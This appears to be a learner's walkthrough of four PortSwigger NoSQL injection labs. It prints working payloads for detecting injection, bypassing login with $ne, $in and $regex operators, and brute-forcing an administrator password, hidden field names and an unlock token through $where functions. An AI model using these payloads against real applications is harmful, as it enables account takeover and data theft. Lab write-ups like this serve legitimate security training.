NoSQL Injection

July 29, 2026
PortSwigger Web Security Injection

Introduction

NoSQL Injection is a web security vulnerability that allows an attacker to manipulate NoSQL database queries. It usually occurs when user input is included in database queries without proper validation, allowing attackers to bypass authentication, access sensitive data, or modify database records.

Labs

01. Detecting NoSQL injection

I used the normal category filter. The application worked as expected. This was my baseline request.

  • Injection
Gifts

I added a single quote (') to the category value. The server returned a syntax error. This showed that the input was processed as JavaScript.

  • Injection
Gifts'

I added another single quote to create a valid JavaScript expression. The query worked again without an error.

  • Injection
Gifts'+'

I used the ' && 0 && 'x payload. The condition was false, so no products were returned.

  • Injection
Gifts' && 0 && 'x

I sent the ' && 1 && 'x payload. The condition was true, so the products were displayed again.

  • Injection
Gifts' && 1 && 'x

I used the '||1||' payload. The expression was always true, so hidden products were displayed. This confirmed the NoSQL Injection vulnerability.

  • Injection
Gifts'||1||'

02. Exploiting NoSQL operator injection to bypass authentication

I logged in with valid credentials. This confirmed the normal login behavior.

I tried to log in with an incorrect password. The server rejected the request.

I used the $ne operator in the password field. The server accepted the request.

I tested the same payload with the administrator account, but the login failed. I continued testing different payloads.

I used the $in operator in the username field. I analyzed the server response.

I added more users to the $in list. The request was successful and confirmed that the operator worked.

I sent a payload that matched multiple users. The server returned an error because too many records were found.

I used the $regex operator for the username. The server accepted the request and searched with a regular expression.

I used a more specific $regex expression. The login was successful with fewer matching users.

I combined the NoSQL operators to bypass authentication. I solved the lab.

03. Exploiting NoSQL injection to extract data

I checked the API request for a normal user. I analyzed the JSON response to understand how the user data was returned.

I used a NoSQL Injection payload to target the administrator account. The server returned the administrator’s information.

I used the this.username[0] condition to test the first character of the username. I found the username one character at a time.

  • Injection
administrator'&&this.username[0]=='a

I used Burp Intruder to test the password length. I sent different values to find the correct length.

  • Injection
administrator'&&this.password.length=='8

I used the this.password.length==8 condition. This confirmed that the administrator password was 8 characters long.

I tested each password character one by one with brute force. I found the administrator password and solved the lab.

  • Injection
administrator'&&this.password[3]=='a

04. Exploiting NoSQL operator injection to extract unknown fields

I sent a login request with an invalid password. I observed the normal error message.

I used the $ne operator in the password field. The account lock message confirmed the NoSQL Injection.

I used the $where function with true and false conditions. I compared the responses.

1: account locked

0: invalid username/password

I tested Object.keys(this)[0] to find the first field name. This helped me discover the document fields.

  • Injection
{"username": "carlos",
"password": {
     "$ne": ""
     },
"$where": "function(){ if(Object.keys(this)[0].match('username')) return 1; else 0; }"
 }

After finding the first field, I tested the second one and continued discovering field names.

  • Injection
{"username": "carlos",
"password": {
     "$ne": ""
     },
"$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"
 }

I tested different field names and identified the fields used by the application.

  • Injection
{"username": "carlos",
"password": {
     "$ne": ""
     },
"$where": "function(){ if(Object.keys(this)[4].match('aa')) return 1; else 0; }"
 }

I analyzed the server response when I used an incorrect field name. This helped me identify valid fields.

I used Burp Intruder to test the field name length. I found the correct length.

  • Injection
"$where": "function(){ if(Object.keys(this)[3].length==1) return 1; else 0; }"

I tested the field name with regular expressions. I started building the field name.

  • Injection
"$where": "function(){ if(Object.keys(this)[3].match(/^a/) return 1; else 0; }

I continued the regular expression tests and found the field name email.

I tested the length of the email field. I found the correct number of characters.

  • Injection
"$where": "function(){ if(this.email.length == 1) return 1; else 0; }"

I used Burp Intruder to brute force the email address one character at a time.

I used regular expressions to extract the first part of the email address.

  • Injection
"$where": "function(){ if(this.email.match(/^a/)) return 1; else 0; }"

carlos@carlos-montoya.net → I completed the brute force process and extracted the full email address.

I used the same technique to target the unlockToken field.

  • Injection
"$where": "function(){ if(Object.keys(this)[4].match(/^a/) ) return 1; else 0; }"

b92f656fecdeefee → I used the unlockToken value in the password reset request. I accessed the password reset page.

I reset the password, accessed the administrator account, and solved the lab.
